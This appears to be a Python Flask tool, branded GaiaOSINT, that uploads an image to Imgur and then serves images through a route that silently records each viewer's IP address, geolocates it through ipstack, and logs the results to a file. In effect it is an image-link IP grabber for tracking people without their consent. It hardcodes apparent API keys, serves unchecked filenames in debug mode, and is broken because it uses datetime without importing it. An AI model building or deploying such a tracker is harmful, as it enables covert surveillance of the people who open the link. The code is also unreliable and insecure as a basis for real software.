import requests
import os
from dotenv import load_dotenv
from flask import Flask, request, send_file, jsonify

# Cargar las claves automáticamente desde el archivo .env
load_dotenv()

app = Flask(__name__)

# Claves API
API_KEY_IPSTACK = '0902c6d29b2eb5453520bcaf0dbe4424'
IMGUR_CLIENT_ID = 'f2acd61ca6a4b03'

# Función para mostrar el arte ASCII
def print_ascii_art():
    art = """
   ██████   █████  ██  █████  
  ██       ██   ██ ██ ██   ██ 
  ██   ███ ███████ ██ ███████  
  ██    ██ ██   ██ ██ ██   ██  
   ██████  ██   ██ ██ ██   ██  

            By GaiaOSINT
      Desarrollado por BO-ot & If

Advertencia: Esta herramienta es para uso educativo y de investigación.
Cualquier uso malintencionado será responsabilidad del usuario.
    """
    print(art)

# Menú principal
def menu():
    print_ascii_art()
    print("\nMenú Principal:")
    print("1. Subir imagen y obtener enlace")
    print("2. Salir")
    choice = input("\nElige una opción (1 o 2): ")

    if choice == '1':
        upload_image()
    elif choice == '2':
        print("Saliendo del programa. ¡Adiós!")
    else:
        print("Opción no válida, intenta de nuevo.")
        menu()

# Función para subir la imagen a Imgur
def upload_image():
    file_path = input("\nArrastra la imagen aquí: ").strip()
    print(f"Ruta recibida: {file_path}")
    print(f"¿El archivo existe? {os.path.exists(file_path)}")

    try:
        with open(file_path, 'rb') as image:
            headers = {'Authorization': f'Client-ID {IMGUR_CLIENT_ID}'}
            files = {'image': image}
            response = requests.post('https://api.imgur.com/3/image', headers=headers, files=files)

            if response.status_code == 200:
                data = response.json()
                print(f"\nEnlace de la imagen: {data['data']['link']}")
            else:
                print("\nError al subir la imagen. Intenta de nuevo.")
    except FileNotFoundError:
        print("\nNo se pudo encontrar el archivo. Intenta de nuevo.")

    input("\nPresiona Enter para volver al menú principal...")
    menu()

# Función para obtener la geolocalización mediante IP
def get_geolocation(ip):
    url = f"http://api.ipstack.com/{ip}?access_key={API_KEY_IPSTACK}"
    response = requests.get(url)
    if response.status_code == 200:
        return response.json()
    return None

# Función para guardar los datos del visitante
def save_visitor_data(ip, location):
    data = {
        'ip': ip,
        'location': location,
        'date': str(datetime.now())
    }
    with open('visitor_data.log', 'a') as file:
        file.write(str(data) + '\n')
    print(f"Datos del visitante guardados: {data}")

# Ruta para servir la imagen y capturar la IP del usuario
@app.route('/imagen/<filename>', methods=['GET'])
def serve_image(filename):
    # Capturar la IP del visitante
    visitor_ip = request.remote_addr
    print(f"Visitante IP: {visitor_ip}")

    # Obtener la geolocalización de la IP
    location = get_geolocation(visitor_ip)
    if location:
        print(f"Ubicación aproximada: {location}")
        save_visitor_data(visitor_ip, location)

    return send_file(f'static/images/{filename}', mimetype='image/jpeg')

if __name__ == "__main__":
    menu()
    app.run(port=5000, debug=True)
